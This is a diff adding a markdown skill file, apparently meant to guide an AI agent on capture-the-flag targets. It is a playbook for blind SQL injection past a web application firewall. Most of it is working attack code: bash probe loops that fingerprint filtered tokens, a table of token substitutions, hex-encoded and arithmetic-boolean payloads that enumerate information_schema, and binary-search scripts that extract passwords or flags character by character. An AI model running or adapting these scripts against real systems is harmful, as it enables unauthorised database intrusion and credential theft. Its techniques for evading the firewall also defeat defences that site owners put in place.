@@ -1,0 +1,212 @@
+---
+name: blind-sqli
+description: "Blind SQL injection under hostile WAF — manual bypass playbook for when sqlmap fails because common tokens (SUBSTRING, IF, AND, WHERE, single quotes) are filtered. Covers token-fingerprinting probe loops, arithmetic-multiplication boolean evaluation, hex-encoded literals, and exponential-probe binary search. Loaded on top of sqli.md when the binary oracle exists but tampers can't pass the WAF."
+metadata:
+  mitre_attack: T1190
+  when_to_use: "blind sqli, blind sql injection, boolean-based sqli, sqlmap blocked, sqlmap waf, sqlmap tamper failed, sql waf bypass, ascii substring filtered, IF function filtered, AND filtered, single quote stripped, hex encoded payload, group_concat blocked, information_schema unauthorized, query parameter filter, character extraction, binary search payload"
+---
+
+# Blind SQL Injection — Manual WAF Bypass
+
+Companion to `sqli.md`. **Load this only after** you have:
+
+1. Confirmed a stable binary oracle (two distinct page states: "User exists" vs "No results", different content lengths, or different HTTP codes).
+2. Confirmed sqlmap with `--tamper` cannot pass the WAF. If sqlmap returns clean dumps, stop and use it — this skill is more expensive in tokens and wall-clock.
+
+If both conditions hold, the goal is to hand-craft a payload that **substitutes** every filtered SQL token until each oracle probe returns a clean true/false signal, then extract the flag bit-by-bit with the smallest possible request count.
+
+## Confirm the oracle first (≤2 minutes)
+
+The whole playbook collapses if your "true" and "false" responses aren't distinguishable. Reduce the response to a single grep-able token before any extraction:
+
+```bash
+probe() {
+  local label="$1"; local payload="$2"
+  local resp
+  resp=$(curl -s --max-time 8 -X POST "http://$TARGET/search.php" \
+    --data-urlencode "username=${payload}")
+  echo "$resp" \
+    | grep -oE "User exists[^<]*|No results|some item is filtered|Error|Welcome" \
+    | head -1
+}
+
+probe "true probe"  "x\"||1=1#"     # expect: User exists
+probe "false probe" "x\"||1=2#"     # expect: No results
+probe "filter probe" "x\"||SLEEP(0)#"  # expect: filtered (token banned)
+```
+
+A single ambiguous response means you do NOT have an oracle yet — re-do recon. Time-based oracles work too, but `bash`'s `time` resolution and HTTP jitter make a content oracle 5-10× more reliable.
+
+## Step 1 — WAF token fingerprint (batched probe script)
+
+Test 10-15 candidate tokens in **one** script, log each as a labelled line. One script run beats 15 sequential `bash` calls (saves ~70% of the round-trip cost).
+
+```bash
+cat > /tmp/probe.sh <<'EOF'
+#!/usr/bin/env bash
+set -u
+TARGET="${TARGET:?set TARGET=host:port}"
+ENDPOINT="${ENDPOINT:-/search.php}"
+PARAM="${PARAM:-username}"
+INJ="${INJ:-x\"||{PAYLOAD}#}"     # outer template; {PAYLOAD} is replaced
+
+probe() {
+  local label="$1"; local payload="$2"
+  local body="${INJ/'{PAYLOAD}'/$payload}"
+  local resp
+  resp=$(curl -s --max-time 6 -X POST "http://$TARGET$ENDPOINT" \
+    --data-urlencode "$PARAM=$body")
+  local sig
+  sig=$(echo "$resp" | grep -oE "User exists[^<]*|No results|filtered|some item[^<]*|Error" | head -1)
+  printf "%-40s | %s\n" "$label" "${sig:-???}"
+}
+
+# === SQL token sniff matrix ===
+probe "1=1 baseline true"              "1=1"
+probe "1=2 baseline false"             "1=2"
+probe "WHERE clause"                   "EXISTS(SELECT 1 FROM users WHERE 1=1)"
+probe "AND keyword"                    "1=1 AND 1=1"
+probe "&& operator"                    "1=1 && 1=1"
+probe "OR keyword"                     "1=0 OR 1=1"
+probe "|| operator"                    "1=0 || 1=1"
+probe "IF function"                    "IF(1=1,1,0)"
+probe "CASE WHEN"                      "(CASE WHEN 1=1 THEN 1 ELSE 0 END)"
+probe "SUBSTRING(str,1,1)"             "SUBSTRING('abc',1,1)='a'"
+probe "MID(str,1,1)"                   "MID('abc',1,1)='a'"
+probe "ASCII(c)"                       "ASCII('a')=97"
+probe "ORD(c)"                         "ORD('a')=97"
+probe "GROUP_CONCAT()"                 "GROUP_CONCAT('a','b')='ab'"
+probe "single-quote 'a'"               "'a'='a'"
+probe "double-quote \"a\""             "\"a\"=\"a\""
+probe "hex 0x61"                       "0x61='a'"
+probe "arithmetic boolean"             "(1=1)*(1=1)=1"
+EOF
+chmod +x /tmp/probe.sh
+TARGET=host.docker.internal:8080 /tmp/probe.sh | tee /tmp/probe.out
+```
+
+Every line that returns `???` (no matching signature) or `filtered` is a banned token. Every line that flips the oracle correctly (`User exists` for the true rows, `No results` for the false rows) is a usable primitive.
+
+Common WAF substitution map (the bench-tested replacements that have worked across multiple targets):
+
+| Filtered token | Substitute that survives |
+|---|---|
+| `SUBSTRING(s,i,n)` | `MID(s,i,n)` |
+| `IF(c,t,f)` | `(CASE WHEN c THEN t ELSE f END)` or arithmetic (see below) |
+| `AND` | `&&` |
+| `OR` | `\|\|` |
+| `WHERE` | `JOIN ... ON` subquery, or move predicate into `SUM((c1)*(c2))` |
+| `'literal'` | `0x6c6974657261` (hex) or `CHAR(108,105,116,...)` |
+| `GROUP_CONCAT(IF(c,t,0))` | `SUM((c)*ASCII(...))` per position |
+
+## Step 2 — boolean evaluation without `IF`/`WHERE`/`AND`
+
+When the WAF strips `IF`, `AND`, `WHERE` together, the cleanest replacement is **arithmetic multiplication of booleans**. MySQL treats `(comparison)` as an integer in {0,1}, and `*` distributes as logical AND:
+
+```
+# AND  →  product
+(table_schema=0x637466) * (table_name=0x7573657273) * (column_name=0x70617373776f7264)
+
+# OR   →  sum > 0
+((column_name=0x...) + (column_name=0x...)) > 0
+
+# IF(cond, A, B)  →  cond * A + (1 - cond) * B
+(cond) * ASCII_OF_A + (1 - (cond)) * ASCII_OF_B
+```
+
+Concrete payload that enumerates `information_schema.columns` without ever using `WHERE/IF/AND`:
+
+```sql
+"||(SELECT(SUM((table_schema=0x637466)*(table_name=0x7573657273)*(column_name=0x70617373776f7264)))FROM(information_schema.columns))>0#
+```
+
+If the page returns "User exists" the predicate is true (column exists), "No results" → false. One probe per `(schema, table, column)` triple.
+
+## Step 3 — hex every string literal you send
+
+Single and double quotes are usually filtered. Convert every literal to hex once at the top of your script, then never use bare strings inside the SQL payload:
+
+```bash
+hex() { python3 -c "import sys; print('0x'+sys.argv[1].encode().hex())" "$1"; }
+SCHEMA_HEX=$(hex "ctf")          # 0x637466
+TABLE_HEX=$(hex "users")          # 0x7573657273
+COL_HEX=$(hex "password")         # 0x70617373776f7264
+```
+
+Reuse these in every payload. Saves you from re-checking which quote variant the WAF blocked this iteration.
+
+## Step 4 — exponential-probe binary search for length
+
+Don't binary-search from 1..N — most targets have passwords/flags between 16 and 64 chars. Probe exponentially first, then refine:
+
+```bash
+# Exponential bound: find the first power that flips false → true
+LEN_HEX=""
+for n in 1 2 4 8 16 32 64 128 256 512 1024; do
+  payload="x\"||LENGTH(${EXTRACT_EXPR})>${n}#"
+  resp=$(curl -s --max-time 6 -X POST "http://$TARGET$ENDPOINT" \
+    --data-urlencode "$PARAM=$payload")
+  if echo "$resp" | grep -q "User exists"; then
+    LOW=$n
+  else
+    HIGH=$n; break
+  fi
+done
+# Binary search in [LOW, HIGH]
+while [ $((HIGH - LOW)) -gt 1 ]; do
+  MID=$(((LOW + HIGH) / 2))
+  payload="x\"||LENGTH(${EXTRACT_EXPR})>${MID}#"
+  resp=$(curl -s --max-time 6 -X POST "http://$TARGET$ENDPOINT" \
+    --data-urlencode "$PARAM=$payload")
+  if echo "$resp" | grep -q "User exists"; then LOW=$MID; else HIGH=$MID; fi
+done
+echo "length=$HIGH"
+```
+
+Worst case 11 + ~10 = 21 requests for any password ≤1024 chars. Pure linear scan would be O(N).
+
+## Step 5 — extract characters with one request per bit (or per char)
+
+Once length is known, the **shortest** extraction is per-character ASCII binary search (≤7 requests per char for printable ASCII). Use `MID()` and `ASCII()`:
+
+```bash
+LEN=18
+RESULT=""
+for i in $(seq 1 $LEN); do
+  LO=32; HI=126
+  while [ $((HI - LO)) -gt 1 ]; do
+    M=$(((LO + HI) / 2))
+    payload="x\"||ASCII(MID((${EXTRACT_EXPR}),${i},1))>${M}#"
+    resp=$(curl -s --max-time 6 -X POST "http://$TARGET$ENDPOINT" \
+      --data-urlencode "$PARAM=$payload")
+    if echo "$resp" | grep -q "User exists"; then LO=$M; else HI=$M; fi
+  done
+  RESULT+=$(printf "\\$(printf '%03o' $HI)")
+  echo "pos $i: $RESULT"
+done
+echo "extracted: $RESULT"
+```
+
+For a 30-char value that's ~210 requests serially. If the server tolerates concurrency, parallelize positions (NOT bit-bisection within a position — that requires serial state). 10 concurrent positions cuts wall-clock by ~10×.
+
+## Step 6 — sanity gate before launching extraction
+
+Before you start a multi-hundred-request loop, **always confirm the EXTRACT_EXPR returns non-empty length on a known-good probe**. Otherwise you spend 5+ minutes extracting from an empty/wrong target.
+
+```bash
+# Probe length once. If length is 0 or absurdly large (>4096), abort — your subquery is wrong.
+payload="x\"||LENGTH(${EXTRACT_EXPR})>0#"
+resp=$(curl -s --max-time 6 -X POST "http://$TARGET$ENDPOINT" \
+  --data-urlencode "$PARAM=$payload")
+echo "$resp" | grep -q "User exists" || {
+  echo "EXTRACT_EXPR returned empty — fix your subquery before extracting"
+  exit 1
+}
+```
+
+## Anti-patterns — don't do these
+
+- **Don't poll background sessions for `extract.py` without a progress signal**. If the script doesn't emit per-character logs, you cannot tell the difference between "still working" and "stuck on an empty result". Either log every position, or kill and restart in foreground.
+- **Don't reuse the same `bash` session for both interactive probe scripts and long extraction loops** — interactive prompts collide with background output and you'll burn `bash_kill` calls. Run extraction in a named session (`work`, `extract`, etc.) and keep `main` for ad-hoc probes.
+- **Don't enumerate `information_schema` blindly with `GROUP_CONCAT`** when `WHERE` is filtered — the unfiltered concat dumps every table/column in the database and you get a 100 KB blob of `0,0,0,...,users` because non-matching rows return 0. Use the arithmetic-multiplication predicate instead and check one cell at a time.
+- **Don't hex-encode the WAF token itself** to bypass — the WAF tokenizes after URL-decode, so `0x53454c454354` (hex SELECT) still matches. Hex helps for **string literals inside the query**, not for SQL keywords.
